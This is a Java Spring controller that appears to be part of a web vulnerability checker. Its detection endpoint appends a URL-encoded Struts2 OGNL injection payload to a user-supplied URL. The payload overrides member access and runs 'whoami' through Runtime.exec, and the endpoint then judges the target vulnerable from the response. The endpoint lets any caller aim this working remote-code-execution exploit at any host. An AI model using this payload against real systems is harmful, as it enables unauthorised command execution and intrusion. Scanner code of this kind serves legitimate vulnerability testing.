package com.cn.ctbri.controller;



import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.apache.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;




@Controller
public class XController {
	//日志对象
	private Logger log = Logger.getLogger(this.getClass());
	
	/**
	 * 跳转到x专区页面
	 */
	@RequestMapping("/Xpage.html")
	public String viewXPage(Model model,HttpServletRequest reques){
	
		return "/source/page/Xpage/viewXPage";
	}
	/**
	 * 检测
	 */
	@RequestMapping("/detectionUrl.html")
	public void detectionUrl(HttpServletRequest request,HttpServletResponse response){

		 boolean tag=true;
	   boolean flag=true;
	   try{
		String urlInfo = request.getParameter("urlInfo");
		String uriPage = urlInfo+"?method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&command=whoami";
		 flag= this.GetDetection(uriPage);
		if(flag==false){
			tag=false;
		}else{
			flag = this.PostDetection(uriPage);
			if(flag==false){
			  tag=false;	
			}
		}
		response.setContentType("textml;charset=UTF-8");
		response.getWriter().print(tag);
	   }catch (Exception e) {
			e.printStackTrace();
		   
	   }
	}
	
	
	  public boolean PostDetection(String urlInfo) {
		  
			 boolean flag =true;
				try {
					log.info(urlInfo);
				
					HttpClient client= new HttpClient();
					PostMethod post=new PostMethod(urlInfo);
					//用于乱码
					post.getParams().setParameter(HttpMethodParams.HTTP_CONTENT_CHARSET,"utf-8"); 
					//提交执行
					int code=client.executeMethod(post);
					String body=null;
					//判断返回值是否成功
					if(code==HttpStatus.SC_OK){
						body=post.getResponseBodyAsString();
					}
				   if(code==200&&body!=null){
					  if(body.indexOf("<!DOCTYPE HTML")==-1){
						  flag=false;
						  log.info("有漏洞");
					  }	else{
						  flag= true;
						  log.info("没有漏洞");
					  }
					}
				} catch (Exception e) {
					e.printStackTrace();
					  log.info("访问地址无响应!");
					flag=true;
				} 
				return flag;
			}
			

			
			public boolean GetDetection(String urlInfo) {
				boolean flag=true;
				try{
				HttpClient client= new HttpClient();
				GetMethod gets = new GetMethod(urlInfo);
				int code=client.executeMethod(gets);
				String body=null;
				if(code==HttpStatus.SC_OK){
					body=gets.getResponseBodyAsString();
				}
				if(code==200&&body!=null){
					  if(body.indexOf("<!DOCTYPE HTML")==-1){
						  flag=false;
						  log.info("有漏洞");
                     }	
				}
				}catch (Exception e) {
					e.printStackTrace();
					  log.info("访问地址无响应!");

					flag=true;
				} 
				return flag;
		    }
}
